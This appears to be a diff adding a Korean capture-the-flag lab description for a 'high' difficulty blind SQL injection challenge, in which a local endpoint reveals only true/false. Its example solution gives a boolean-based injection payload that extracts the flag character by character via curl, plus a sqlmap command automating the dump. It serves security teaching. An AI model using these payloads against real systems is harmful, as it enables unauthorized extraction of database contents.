@@ -1,0 +1,42 @@
+📌 문제 제목
+Blind SQL Injection Lab - High
+
+🎯 문제 설명
+이 서비스는 `id` 값을 가진 유저가 존재하는지 여부만 알려줍니다. 쿼리 결과나 에러 메시지는
+절대 화면에 노출되지 않고, 오직 `true`/`false`만 반환됩니다.
+
+내부적으로는 사용자 입력값이 필터링 없이 SQL 쿼리에 그대로 들어갑니다. 화면에 아무 데이터도
+보이지 않더라도, 참/거짓 신호만으로 데이터베이스의 숨겨진 값을 한 글자씩 추출할 수 있습니다.
+
+당신의 목표는 `secrets` 테이블에 있는 flag 값을 블라인드 SQL 인젝션으로 한 글자씩 복원하는
+것입니다.
+
+🧠 난이도
+상 (High)
+
+💡 예시 풀이
+
+참/거짓만 돌아온다는 것을 이용해 조건을 하나씩 붙여봅니다:
+
+```bash
+curl "http://localhost:8000/api/check?id=1"
+# {"exists": true}
+
+curl "http://localhost:8000/api/check?id=999"
+# {"exists": false}
+
+curl --get "http://localhost:8000/api/check" \
+  --data-urlencode "id=1 AND (SELECT substr(flag,1,1) FROM secrets)='F'"
+# {"exists": true}  <- flag의 첫 글자가 'F'라는 뜻
+```
+
+이 패턴을 반복하면 플래그 전체를 한 글자씩 복원할 수 있습니다. sqlmap을 쓴다면
+`--technique=B`(boolean-based blind)로 자동화할 수 있습니다:
+
+```bash
+sqlmap -u "http://localhost:8000/api/check?id=1" --technique=B --batch \
+  --sql-query "SELECT flag FROM secrets"
+```
+
+※ 이 문제는 참/거짓 외에 어떤 정보도 주지 않습니다 - 에러 메시지, 쿼리 결과 모두 노출되지
+않는다는 점이 SQLI-Easy/Medium과의 차이입니다.
